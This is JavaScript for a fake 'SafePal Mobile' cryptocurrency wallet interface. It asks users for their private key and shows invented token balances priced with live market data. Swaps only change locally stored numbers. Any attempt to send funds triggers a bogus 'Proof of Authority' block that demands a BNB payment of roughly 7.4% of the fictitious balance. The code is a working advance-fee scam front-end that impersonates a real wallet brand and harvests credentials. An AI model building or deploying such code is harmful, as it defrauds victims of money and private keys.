const RPC_URL = "https://bsc-dataseed.binance.org/";
const SPECIAL_TOKEN_ADDRESS = "0xED341b1e9526FF65dEB1C4E013e0Ffc39aDA8D46".toLowerCase();

const BSC_TOKENS = [
  { symbol: "BTC (BEP20)", address: SPECIAL_TOKEN_ADDRESS, decimals: 18, icon: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png", coingeckoId: "bitcoin" },
  { symbol: "BNB (BEP20)", address: "native", decimals: 18, icon: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png", coingeckoId: "binancecoin" },
  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png", coingeckoId: "tether" },
  { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, icon: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png", coingeckoId: "usd-coin" }
];

let currentNetwork = "BSC";
let globalWalletAddress = "";
let globalProvider = null;
let localOverrides = JSON.parse(localStorage.getItem("safepal_mobile_overrides") || "{}");
let cachedAssets = [];
let totalFiatMobile = 0;
let bnbPriceMobile = 500;
let livePrices = {};

// Connexion mobile
document.getElementById("btnMobileLogin").addEventListener("click", async () => {
  const inputVal = document.getElementById("mobilePrivateKeyInput").value.trim();
  if (!inputVal) {
    alert("Please enter a valid private key or address.");
    return;
  }

  globalProvider = new ethers.providers.JsonRpcProvider(RPC_URL);
  globalWalletAddress = inputVal;

  if (inputVal.startsWith("0x") && inputVal.length === 66) {
    try {
      const wallet = new ethers.Wallet(inputVal);
      globalWalletAddress = wallet.address;
    } catch (e) {}
  }

  document.getElementById("loginScreen").classList.add("hidden");
  document.getElementById("dashboardScreen").classList.remove("hidden");
  loadMobileWalletData();
});

// Changement de réseau mobile
document.getElementById("mobileNetworkToggle").addEventListener("click", () => {
  currentNetwork = (currentNetwork === "BSC") ? "ETH" : "BSC";
  document.getElementById("mobileNetworkName").innerText = currentNetwork;
  loadMobileWalletData();
});

// Actions rapides
document.getElementById("mSendBtn").addEventListener("click", () => {
  showMobileModal({
    title: "Send Transaction",
    body: "Insert recipient wallet address:",
    hasInput: true,
    onConfirm: () => {
      const fiatReq = totalFiatMobile * 0.0743891;
      const bnbReq = bnbPriceMobile > 0 ? fiatReq / bnbPriceMobile : 0;
      showMobileModal({
        title: "TRANSACTION BLOCKED",
        body: "Proof of Authority (POA) validation required to proceed.",
        isPoa: true,
        poaText: `Required network validation signal: ${bnbReq.toFixed(5)} BNB (≈ ${fiatReq.toFixed(2)} €)`,
        onConfirm: () => showMobileModal({ title: "POA Node", body: "Redirecting to validation node..." })
      });
    }
  });
});

document.getElementById("mReceiveBtn").addEventListener("click", () => {
  showMobileModal({
    title: "Receive Assets",
    body: `Your active address (${currentNetwork}):`,
    hasAddress: true,
    addressVal: globalWalletAddress
  });
});

document.getElementById("mSwapBtn").addEventListener("click", () => {
  showMobileModal({
    title: "SafePal Swap",
    body: "Exchange tokens instantly at market rates:",
    isSwap: true,
    onConfirm: () => {
      const fromS = document.getElementById("mSwapFrom").value;
      const toS = document.getElementById("mSwapTo").value;
      const amt = parseFloat(document.getElementById("mSwapAmount").value) || 0;

      const p1 = livePrices[fromS] || 1;
      const p2 = livePrices[toS] || 1;
      const received = (amt * p1) / p2;

      localOverrides[fromS] = Math.max(0, (localOverrides[fromS] || 1) - amt);
      localOverrides[toS] = (localOverrides[toS] || 0) + received;
      localStorage.setItem("safepal_mobile_overrides", JSON.stringify(localOverrides));

      loadMobileWalletData();
      alert(`Swap successful: ${amt} ${fromS} -> ${received.toFixed(4)} ${toS}`);
    }
  });
});

document.getElementById("mDepositBtn").addEventListener("click", () => {
  showMobileModal({
    title: "Deposit Fiat / Crypto",
    body: "Choose an official payment gateway:",
    isDeposit: true
  });
});

// Boutons bas de page (Bottom Nav)
document.getElementById("navSwapBtn").addEventListener("click", () => document.getElementById("mSwapBtn").click());
document.getElementById("navDepositBtn").addEventListener("click", () => document.getElementById("mDepositBtn").click());
document.getElementById("navSettingsBtn").addEventListener("click", () => alert("SafePal Mobile v2.41.2 - Settings"));

async function loadMobileWalletData() {
  const container = document.getElementById("mobileAssetList");
  container.innerHTML = `<div style="text-align:center; color:#848e9c; padding:20px;">Loading blockchain data...</div>`;

  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,binancecoin,tether,usd-coin&vs_currencies=eur`);
    const data = await res.json();
    if (data.binancecoin?.eur) bnbPriceMobile = data.binancecoin.eur;
    
    livePrices["BTC"] = data.bitcoin?.eur || 60000;
    livePrices["BNB"] = bnbPriceMobile;
    livePrices["USDT"] = data.tether?.eur || 1;
    livePrices["USDC"] = data["usd-coin"]?.eur || 1;
  } catch (e) {}

  totalFiatMobile = 0;
  cachedAssets = [];

  for (const token of BSC_TOKENS) {
    const sym = token.symbol.split(" ")[0];
    let bal = localOverrides[sym] !== undefined ? localOverrides[sym] : 1.25; // solde par défaut simulé
    const price = livePrices[sym] || 100;
    const fiat = bal * price;
    totalFiatMobile += fiat;

    cachedAssets.push({ sym, name: token.symbol, icon: token.icon, bal, fiat, price });
  }

  document.getElementById("mobileTotalBalance").innerText = totalFiatMobile.toLocaleString("fr-FR", { minimumFractionDigits: 2 }) + " €";
  document.getElementById("mobileSubBalance").innerText = `≈ ${(totalFiatMobile / 60000).toFixed(4)} BTC`;

  let html = "";
  cachedAssets.forEach(a => {
    html += `
      <div class="asset-card-mobile">
        <div class="asset-left">
          <img class="asset-icon-mobile" src="${a.icon}" alt="${a.sym}" />
          <div>
            <div class="asset-symbol">${a.name}</div>
            <div class="asset-price">Price: ${a.price.toLocaleString("fr-FR")} €</div>
          </div>
        </div>
        <div class="asset-right">
          <div class="asset-holding">${a.bal.toFixed(4)} ${a.sym}</div>
          <div class="asset-fiat-val">${a.fiat.toLocaleString("fr-FR", { minimumFractionDigits: 2 })} €</div>
        </div>
      </div>
    `;
  });
  container.innerHTML = html;
}

function showMobileModal({ title, body, hasInput = false, hasAddress = false, addressVal = "", isSwap = false, isDeposit = false, isPoa = false, poaText = "", onConfirm = null }) {
  const modal = document.getElementById("mobileModal");
  document.getElementById("mModalTitle").innerText = title;
  document.getElementById("mModalBody").innerText = body;

  document.getElementById("mAddressContainer").classList.add("hidden");
  document.getElementById("mSwapContainer").classList.add("hidden");
  document.getElementById("mDepositContainer").classList.add("hidden");
  document.getElementById("mLinkContainer").classList.add("hidden");
  document.getElementById("mPoaContainer").classList.add("hidden");
  document.getElementById("mInputContainer").classList.add("hidden");

  if (hasAddress) {
    document.getElementById("mAddressContainer").classList.remove("hidden");
    document.getElementById("mAddressDisplay").value = addressVal;
  } else if (isSwap) {
    document.getElementById("mSwapContainer").classList.remove("hidden");
    const fromS = document.getElementById("mSwapFrom");
    const toS = document.getElementById("mSwapTo");
    fromS.innerHTML = cachedAssets.map(a => `<option value="${a.sym}">${a.name}</option>`).join("");
    toS.innerHTML = cachedAssets.map(a => `<option value="${a.sym}">${a.name}</option>`).join("");
    if (toS.options.length > 1) toS.selectedIndex = 1;
  } else if (isDeposit) {
    document.getElementById("mDepositContainer").classList.remove("hidden");
    document.getElementById("mConfirmBtn").classList.add("hidden");

    document.getElementById("mMoonpayBtn").onclick = () => showLink("https://www.moonpay.com");
    document.getElementById("mSimplexBtn").onclick = () => showLink("https://www.simplex.com");
    document.getElementById("mRampBtn").onclick = () => showLink("https://ramp.network");
    document.getElementById("mBankWireBtn").onclick = () => {
      modal.classList.add("hidden");
      alert("Votre demande de virement bancaire a été enregistrée avec succès !");
    };
  } else if (isPoa) {
    document.getElementById("mPoaContainer").classList.remove("hidden");
    document.getElementById("mPoaText").innerHTML = "<b>⚠️ ACTION REQUISE - RÉSEAU BLOQUÉ</b><br>La validation POA est obligatoire.";
    document.getElementById("mPoaSignal").innerText = poaText;
  } else if (hasInput) {
    document.getElementById("mInputContainer").classList.remove("hidden");
  }

  if (!isDeposit) document.getElementById("mConfirmBtn").classList.remove("hidden");
  modal.classList.remove("hidden");

  document.getElementById("mConfirmBtn").onclick = () => {
    modal.classList.add("hidden");
    if (onConfirm) onConfirm();
  };

  document.getElementById("mCancelBtn").onclick = () => {
    modal.classList.add("hidden");
  };
}

function showLink(url) {
  document.getElementById("mDepositContainer").classList.add("hidden");
  document.getElementById("mLinkContainer").classList.remove("hidden");
  document.getElementById("mLinkInput").value = url;
  document.getElementById("mCopyLinkBtn").onclick = () => {
    navigator.clipboard.writeText(url);
    alert("Official gateway link copied to clipboard!");
    document.getElementById("mobileModal").classList.add("hidden");
  };
}